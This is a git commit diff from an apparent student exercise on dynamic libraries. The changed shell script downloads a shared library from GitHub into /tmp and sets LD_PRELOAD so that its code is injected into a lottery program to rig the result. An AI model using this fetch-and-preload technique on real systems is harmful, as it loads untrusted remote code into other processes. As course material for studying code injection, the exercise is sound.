644ce0f6635143c9e9f1d539f180c07dc691345b
warimap <warimapharium@.com>
2023-05-22 09:32:04 -0700

    Task 3. Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://raw.github.com/warima/alx-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
-export LD_PRELOAD=/tmp/nrandom.so
+wget -qP /tmp/ https://github.com/warimap/alx-low_level_programming/raw/master/0x18-dynamic_libraries/mymole.so
+export LD_PRELOAD="/tmp/mymole.so"
